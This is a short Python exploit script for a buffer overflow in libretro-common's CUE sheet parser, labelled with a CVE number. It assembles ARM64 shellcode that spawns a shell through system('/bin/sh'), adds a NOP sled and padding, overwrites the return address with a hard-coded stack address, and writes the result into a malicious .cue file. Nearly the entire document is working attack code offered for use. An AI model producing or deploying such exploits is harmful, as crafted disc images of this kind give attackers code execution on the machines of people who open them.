#!/usr/bin/env python3
"""
CVE-2025-9809 Exploit - Buffer Overflow in libretro-common cdfs_open_cue_track()
Spawns shell via system("/bin/sh")
"""

import struct

# ARM64 shellcode that calls system("/bin/sh")
# This shellcode has NO null bytes!
shellcode = bytes([
    # Load /bin/sh address (0x0000fffffffff23f) into x0
    0xe0, 0x47, 0x9e, 0xd2,  # movz x0, #0xf23f
    0xe0, 0xff, 0xbf, 0xf2,  # movk x0, #0xffff, lsl #16
    0xe0, 0xff, 0xdf, 0xf2,  # movk x0, #0xffff, lsl #32
    
    # Load system() address (0x0000fffff7e3cec4) into x30
    0x9e, 0x9d, 0x99, 0xd2,  # movz x30, #0xcec4
    0x7e, 0xfc, 0xbe, 0xf2,  # movk x30, #0xf7e3, lsl #16
    0xfe, 0xff, 0xdf, 0xf2,  # movk x30, #0xffff, lsl #32
    
    # Call system() by returning to it
    0xc0, 0x03, 0x5f, 0xd6,  # ret
])

# Build exploit payload
nop = b"\x1f\x20\x03\xd5"  # ARM64 NOP instruction
nop_sled = nop * 400        # 1600 bytes of NOPs

# Construct payload
payload = nop_sled + shellcode
payload = payload.ljust(2144, b"A")  # Pad to return address offset

# Return address: points to our shellcode at 0xffffffffe348
# Buffer base: 0xffffffffdd08
# Shellcode at: 0xffffffffdd08 + 1600 = 0xffffffffe348
payload += b"\x48\xe3\xff\xff\xff\xff\xff\xff"

# Write malicious .cue file
output_file = "formats/cdfs/overflow.cue"
with open(output_file, "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

